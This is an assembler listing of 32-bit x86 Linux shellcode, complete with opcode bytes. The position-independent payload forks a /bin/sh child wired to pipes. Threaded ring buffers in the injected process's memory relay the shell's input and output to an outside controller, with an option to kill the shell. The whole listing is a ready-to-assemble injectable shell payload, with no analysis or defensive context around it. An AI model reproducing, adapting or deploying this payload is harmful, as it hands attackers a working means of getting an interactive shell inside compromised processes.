     1                                  BITS 32
     2                                  
     3                                  ;		     #   1   2   3   4   5   6
     4                                  ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
     5                                  ; syscall return: EAX
     6                                  
     7                                  ;
     8                                  ; http://www.lxhp.in-berlin.de/lhpsyscal.html
     9                                  ;
    10                                  ; all necessary system calls:
    11                                  ; ===========================
    12                                  ;
    13                                  ; clone:	eax: 120
    14                                  ; 		ebx: clone-flags
    15                                  ; 		ecx: ptr to top of (distinct) stack space
    16                                  ; 		edx: ptr to pt_regs or NULL
    17                                  ;
    18                                  ; close:	eax: 6
    19                                  ; 		ebx: fd to close
    20                                  ;
    21                                  ; dup2:	eax: 63
    22                                  ; 		ebx: fd 2 dup
    23                                  ; 		ecx: fd to assign the dup to
    24                                  ;
    25                                  ; execve:	eax: 11
    26                                  ; 		ebx: ptr to string of program path&name
    27                                  ; 		ecx: ptr to argv[]
    28                                  ; 		edx: ptr to envv[]
    29                                  ;
    30                                  ; exit:	eax: 1
    31                                  ; 		ebx: exit code
    32                                  ;
    33                                  ; fcntl:	eax: 55
    34                                  ; 		ebx: fd
    35                                  ; 		ecx: command code
    36                                  ; 		edx: file locks: ptr to writable struct flock
    37                                  ;
    38                                  ; fork:	eax: 2
    39                                  ; 		ebx... are passed to forked process.
    40                                  ;
    41                                  ; kill:	eax: 37
    42                                  ; 		ebx: pid (?)
    43                                  ; 		ecx: signal (?)
    44                                  ; 		SIGKILL = 9
    45                                  ;
    46                                  ; nanosleep:	eax: 162
    47                                  ; 		ebx: ptr to struct timespec
    48                                  ; 		ecx: ptr to alterable struct timespec
    49                                  ;
    50                                  ; read:	eax: 3
    51                                  ; 		ebx: fd
    52                                  ; 		ecx: ptr to buffer
    53                                  ; 		edx: count
    54                                  ;
    55                                  ; write:	eax: 4
    56                                  ; 		ebx: fd
    57                                  ; 		ecx: ptr to buffer
    58                                  ; 		edx: count
    59                                  ;
    60                                  ; pipe:	eax: 42
    61                                  ; 		ebx: ptr to dword[2]
    62                                  ;
    63                                  
    64                                  start:
    65 00000000 E800000000              	call near shcode_start
    66                                  shcode_start:
    67 00000005 5D                      	pop	ebp
    68 00000006 81C513020000            	add	ebp, data_start - shcode_start
    69                                  
    70                                  	; pipe(m2sh)
    71 0000000C 31C0                    	xor	eax,eax
    72 0000000E B02A                    	mov	al,42
    73 00000010 89EB                    	mov	ebx,ebp
    74 00000012 81C318000000            	add	ebx,m2sh_0
    75 00000018 CD80                    	int	0x80
    76                                  
    77 0000001A 3D00000000              	cmp	eax,0
    78 0000001F 7524                    	jne	child_dead_interleaved
    79                                  
    80                                  	; pipe(sh2m)
    81 00000021 31C0                    	xor	eax,eax
    82 00000023 B02A                    	mov	al,42
    83 00000025 89EB                    	mov	ebx,ebp
    84 00000027 81C320000000            	add	ebx,sh2m_0
    85 0000002D CD80                    	int	0x80
    86                                  
    87 0000002F 3D00000000              	cmp	eax,0
    88 00000034 750F                    	jne	child_dead_interleaved
    89                                  
    90                                  	; fork()
    91 00000036 31C0                    	xor	eax,eax
    92 00000038 B002                    	mov	al,2
    93 0000003A CD80                    	int	0x80
    94                                  
    95 0000003C 3D00000000              	cmp	eax,0
    96 00000041 7407                    	je	child
    97 00000043 7F5B                    	jg	parent			; signed compare
    98                                  child_dead_interleaved:
    99 00000045 E996010000              	jmp	child_dead
   100                                  
   101                                  child:
   102                                  	; dup2(m2sh[0], 0)   (dup to stdin)
   103 0000004A 31C0                    	xor	eax,eax
   104 0000004C B03F                    	mov	al,63
   105 0000004E 8B9D18000000            	mov	ebx,[ebp+m2sh_0]
   106 00000054 31C9                    	xor	ecx,ecx
   107 00000056 CD80                    	int	0x80
   108                                  
   109 00000058 39C8                    	cmp	eax,ecx
   110 0000005A 753F                    	jne	leave_sh_interleaved
   111                                  
   112                                  	; dup2(sh2m[1], 1)   (dup to stdout)
   113 0000005C 31C0                    	xor	eax,eax
   114 0000005E B03F                    	mov	al,63
   115 00000060 8B9D24000000            	mov	ebx,[ebp+sh2m_1]
   116 00000066 41                      	inc	ecx
   117 00000067 CD80                    	int	0x80
   118                                  
   119 00000069 39C8                    	cmp	eax,ecx
   120 0000006B 752E                    	jne	leave_sh_interleaved
   121                                  %ifndef OPTIMIZE_FOR_SIZE_HARD
   122                                  	; dup2(sh2m[1], 2)   (dup to stderr)
   123 0000006D 31C0                    	xor	eax,eax
   124 0000006F B03F                    	mov	al,63
   125                                  ;	mov	ebx,[ebp+sh2m_1]
   126 00000071 41                      	inc	ecx
   127 00000072 CD80                    	int	0x80
   128                                  
   129 00000074 39C8                    	cmp	eax,ecx
   130 00000076 7523                    	jne	leave_sh_interleaved
   131                                  %endif
   132                                  
   133                                  	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
   134 00000078 31C0                    	xor	eax,eax
   135 0000007A B00B                    	mov	al,11
   136 0000007C 89EB                    	mov	ebx,ebp
   137 0000007E 81C309000000            	add	ebx,execve_command		; ebx -> '/bin/sh',0
   138                                  
   139 00000084 89E9                    	mov	ecx,ebp
   140 00000086 81C128020000            	add	ecx,foo				; ecx -> foo
   141                                  
   142 0000008C 31D2                    	xor	edx,edx
   143 0000008E 8919                    	mov	[ecx],ebx			; foo := @'/bin/sh',0
   144 00000090 895104                  	mov	[ecx+4],edx			; bar := NULL
   145 00000093 89CA                    	mov	edx,ecx
   146 00000095 42                      	inc	edx
   147 00000096 42                      	inc	edx
   148 00000097 42                      	inc	edx
   149 00000098 42                      	inc	edx				; edx -> bar
   150 00000099 CD80                    	int	0x80
   151                                  
   152                                  	; fail if execve did not work.
   153                                  leave_sh_interleaved:
   154 0000009B E971010000              	jmp	leave_sh
   155                                  
   156                                  parent:
   157                                  	; remember child's PID
   158 000000A0 898514000000            	mov	[ebp+child_pid],eax
   159                                  
   160                                  %ifndef OPTIMIZE_FOR_SIZE_HARD
   161                                  	; close(m2sh[0])
   162 000000A6 31C0                    	xor	eax,eax
   163 000000A8 B006                    	mov	al,6
   164 000000AA 8B9D18000000            	mov	ebx,[ebp+m2sh_0]
   165 000000B0 CD80                    	int	0x80
   166                                  
   167                                  	; close(sh2m[1])
   168 000000B2 31C0                    	xor	eax,eax
   169 000000B4 B006                    	mov	al,6
   170 000000B6 8B9D24000000            	mov	ebx,[ebp+sh2m_1]
   171 000000BC CD80                    	int	0x80
   172                                  %endif
   173                                  
   174                                  	; clone:
   175                                  	; one thread for reader, one thread for writer
   176 000000BE 31C0                    	xor	eax,eax
   177 000000C0 B078                    	mov	al,120
   178                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
   179                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
   180                                  	; CLONE_PTRACE = 0x00002000
   181 000000C2 BB000F0100              	mov	ebx,0x00010f00
   182 000000C7 89E1                    	mov	ecx,esp	; just use same stack with a delta of 64
   183 000000C9 81EC40000000            	sub	esp,64 ; we need the stack only a tiny bit.
   184 000000CF 31D2                    	xor	edx,edx
   185 000000D1 CD80                    	int	0x80
   186                                  
   187 000000D3 3D00000000              	cmp	eax,0
   188                                  	; ret=0 -> clone
   189 000000D8 7407                    	je	thread_write_to_master_interleaved	; clone is writer
   190                                  	; ret>0 -> original
   191 000000DA 7F0A                    	jg	thread_read_from_master			; original is reader
   192                                  	; error if ret<0
   193 000000DC E9FF000000              	jmp	child_dead
   194                                  
   195                                  thread_write_to_master_interleaved:
   196 000000E1 E98D000000              	jmp	thread_write_to_master
   197                                  
   198                                  	; ==================================== the READER thread:
   199                                  thread_read_from_master:
   200                                  	; will write to child via m2sh[1]
   201                                  	; remember RINGBUFFER from_master in esi
   202 000000E6 89EE                    	mov	esi,ebp
   203 000000E8 81C628000000            	add	esi,rfrm_buffer
   204                                  
   205                                  reader_while_fds_ok:
   206                                  	; while both FDs are ok:
   207 000000EE 8A8503000000            	mov	al,[ebp+to_child_ok]
   208 000000F4 028504000000            	add	al,[ebp+from_child_ok]
   209 000000FA 3C02                    	cmp	al,2
   210 000000FC 7546                    	jne	leave_sh_second_interleaved
   211                                  
   212                                  	; test, if master requested child to be terminated
   213 000000FE 8A8502000000            	mov	al,[ebp+terminate_child]
   214 00000104 3C00                    	cmp	al,0
   215 00000106 7548                    	jne	do_terminate_child
   216                                  
   217                                  	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
   218 00000108 31C0                    	xor	eax,eax
   219 0000010A 8A8505000000            	mov	al,[ebp+rfrm_writer_pos]
   220 00000110 2A8506000000            	sub	al,[ebp+rfrm_reader_pos]
   221 00000116 7431                    	jz	reader_sleep
   222                                  
   223                                  	; write a chunk to the child.
   224                                  	; EAX/AL is the number of bytes to be written to the child.
   225 00000118 31DB                    	xor	ebx,ebx
   226 0000011A 8A9D06000000            	mov	bl,[ebp+rfrm_reader_pos]
   227 00000120 89D9                    	mov	ecx,ebx
   228 00000122 00C1                    	add	cl,al
   229 00000124 38D9                    	cmp	cl,bl
   230 00000126 7704                    	ja	reader_no_overlap	; writer is behind reader. no overlap
   231                                  
   232 00000128 31C0                    	xor	eax,eax
   233 0000012A 28C8                    	sub	al,cl			; number of bytes to end of buffer.
   234                                  
   235                                  reader_no_overlap:
   236                                  	; write the data from the ringbuffer to the child
   237 0000012C 89C2                    	mov	edx,eax
   238 0000012E 31C0                    	xor	eax,eax
   239 00000130 B004                    	mov	al,4
   240 00000132 01F3                    	add	ebx,esi		; EBX points to position in buffer where the to-be-written data resides
   241 00000134 8B8D1C000000            	mov	ecx,[ebp+m2sh_1]
   242 0000013A CD80                    	int	0x80
   243                                  
   244                                  	; mark chunk as read
   245 0000013C 009506000000            	add	[ebp+rfrm_reader_pos], dl
   246 00000142 EBAA                    	jmp	reader_while_fds_ok
   247                                  
   248                                  leave_sh_second_interleaved:
   249 00000144 E9C8000000              	jmp	leave_sh
   250                                  
   251                                  reader_sleep:
   252 00000149 E875000000              	call	sleep_short
   253 0000014E EB9E                    	jmp	reader_while_fds_ok
   254                                  
   255                                  do_terminate_child:
   256                                  	; send a SIGKILL to child
   257 00000150 31C0                    	xor	eax,eax
   258 00000152 B025                    	mov	al,37
   259 00000154 8B9D14000000            	mov	ebx,[ebp+child_pid]
   260 0000015A 31C9                    	xor	ecx,ecx
   261 0000015C B109                    	mov	cl,9	; SIGKILL
   262 0000015E CD80                    	int	0x80
   263                                  
   264                                  	; clear to_child_ok
   265 00000160 31C0                    	xor	eax,eax
   266 00000162 898503000000            	mov	[ebp+to_child_ok], eax
   267                                  	; and from_child_ok
   268 00000168 898504000000            	mov	[ebp+from_child_ok], eax
   269 0000016E E99E000000              	jmp	leave_sh
   270                                  
   271                                  	; ==================================== the WRITER thread:
   272                                  thread_write_to_master:
   273                                  	; will read from child via sh2m[0]
   274                                  	; remember RINGBUFFER to_master in esi
   275 00000173 89EE                    	mov	esi,ebp
   276 00000175 81C628010000            	add	esi,rto_buffer
   277                                  
   278                                  writer_while_fds_ok:
   279                                  	; while both FDs are ok:
   280 0000017B 8A8503000000            	mov	al,[ebp+to_child_ok]
   281 00000181 028504000000            	add	al,[ebp+from_child_ok]
   282 00000187 3C02                    	cmp	al,2
   283 00000189 7555                    	jne	child_dead
   284                                  
   285                                  	; if ringbuffer is FULL ( _reader == _writer+1 ), do nothing.
   286 0000018B 8A8507000000            	mov	al,[ebp+rto_writer_pos]
   287 00000191 FEC0                    	inc	al
   288 00000193 2A8508000000            	sub	al,[ebp+rto_reader_pos]
   289 00000199 7421                    	jz	writer_sleep
   290                                  
   291                                  	; read ONE SINGLE BYTE and pass it into the buffer.
   292 0000019B 31C0                    	xor	eax,eax
   293 0000019D B003                    	mov	al,3
   294 0000019F 8B9D20000000            	mov	ebx,[ebp+sh2m_0]
   295 000001A5 31C9                    	xor	ecx,ecx
   296 000001A7 8A8D07000000            	mov	cl,[ebp+rto_writer_pos]
   297 000001AD 01F1                    	add	ecx,esi
   298 000001AF 31D2                    	xor	edx,edx
   299 000001B1 42                      	inc	edx
   300 000001B2 CD80                    	int	0x80
   301                                  
   302 000001B4 FE8507000000            	inc byte [ebp+rto_writer_pos]
   303                                  
   304                                  	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
   305                                  	; read() will block if there is no data from child.
   306 000001BA EBBF                    	jmp	writer_while_fds_ok
   307                                  
   308                                  writer_sleep:
   309 000001BC E802000000              	call	sleep_short
   310 000001C1 EBB8                    	jmp	writer_while_fds_ok
   311                                  
   312                                  	; ==================================================================
   313                                  
   314                                  sleep_short:
   315                                  	; sleep 0.001 seconds:
   316                                  	; usleep(0,1000000);
   317 000001C3 31C0                    	xor	eax,eax
   318 000001C5 B0A2                    	mov	al, 162
   319 000001C7 89EB                    	mov	ebx, ebp
   320 000001C9 81C328020000            	add	ebx, foo
   321 000001CF 89D9                    	mov	ecx, ebx
   322 000001D1 31D2                    	xor	edx,edx
   323 000001D3 8913                    	mov long [ebx], edx		; seconds
   324 000001D5 BAA0860100              	mov	edx,100000
   325 000001DA 895304                  	mov long [ebx+4], edx		; nanoseconds
   326 000001DD CD80                    	int	0x80
   327                                  
   328 000001DF C3                      	ret
   329                                  
   330                                  child_dead:
   331                                  	; at most wait 2 seconds for master's ACK
   332 000001E0 31C0                    	xor	eax,eax
   333 000001E2 388501000000            	cmp	[ebp+child_is_dead_ACK], al
   334 000001E8 7527                    	jne	leave_sh
   335 000001EA B002                    	mov	al,2
   336 000001EC 388500000000            	cmp	[ebp+child_is_dead], al
   337 000001F2 771D                    	ja	leave_sh
   338                                  
   339 000001F4 FE4500                  	inc byte [ebp]
   340                                  
   341                                  	; usleep(1,0):
   342 000001F7 31C0                    	xor	eax,eax
   343 000001F9 B0A2                    	mov	al, 162
   344 000001FB 89EB                    	mov	ebx, ebp
   345 000001FD 81C328020000            	add	ebx, foo
   346 00000203 89D9                    	mov	ecx, ebx
   347 00000205 31D2                    	xor	edx,edx
   348 00000207 895304                  	mov long [ebx+4], edx		; nanoseconds
   349 0000020A 42                      	inc	edx
   350 0000020B 8913                    	mov long [ebx], edx		; seconds
   351 0000020D CD80                    	int	0x80
   352                                  
   353 0000020F EBCF                    	jmp	child_dead
   354                                  
   355                                  leave_sh:
   356                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
   357 00000211 31C0                    	xor	eax,eax
   358 00000213 89C3                    	mov	ebx,eax
   359 00000215 40                      	inc	eax
   360 00000216 CD80                    	int	0x80
   361                                  
   362                                  ; =============================================================================
   363                                  ; DATA
   364                                  data_start EQU $
   365                                  
   366                                  ; do not change order of the following stuff!
   367                                  
   368                                  child_is_dead EQU $ - data_start
   369 00000218 00                      	db		0
   370                                  child_is_dead_ACK EQU $ - data_start
   371 00000219 00                      	db		0
   372                                  
   373                                  terminate_child	EQU $ - data_start
   374 0000021A 00                      	db		0
   375                                  
   376                                  to_child_ok EQU $ - data_start
   377 0000021B 01                      	db		1
   378                                  from_child_ok EQU $ - data_start
   379 0000021C 01                      	db		1
   380                                  
   381                                  ; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
   382                                  ; a ringbuffer is FULL, if _reader == _writer+1
   383                                  
   384                                  ; ringbuffer from_master:
   385                                  
   386                                  rfrm_writer_pos EQU $ - data_start
   387 0000021D 00                      	db		0
   388                                  rfrm_reader_pos EQU $ - data_start
   389 0000021E 00                      	db		0
   390                                  
   391                                  ; ringbuffer to_master:
   392                                  
   393                                  rto_writer_pos EQU $ - data_start
   394 0000021F 00                      	db		0
   395                                  rto_reader_pos EQU $ - data_start
   396 00000220 00                      	db		0
   397                                  
   398                                  execve_command EQU $ - data_start
   399 00000221 2F62696E2F736800        	db	'/bin/sh',0
   400                                  
   401                                  ; =============================================================================
   402                                  ; stuff that is not required to be initialized:
   403 00000229 90<rept>                align 4
   404                                  
   405                                  child_pid EQU $ - data_start
   406                                  
   407                                  ; pipes middleman<->shell
   408                                  m2sh_0 EQU $ - data_start + 4			; shell reads
   409                                  m2sh_1 EQU $ - data_start + 8			; master writes
   410                                  sh2m_0 EQU $ - data_start + 12			; master reads
   411                                  sh2m_1 EQU $ - data_start + 16			; shell writes
   412                                  
   413                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
   414                                  rto_buffer EQU $ - data_start + 276		; TO master
   415                                  
   416                                  foo EQU $ - data_start + 532
   417                                  bar EQU $ - data_start + 536
   418                                  baz EQU $ - data_start + 540
   419                                  qux EQU $ - data_start + 544
   420                                  
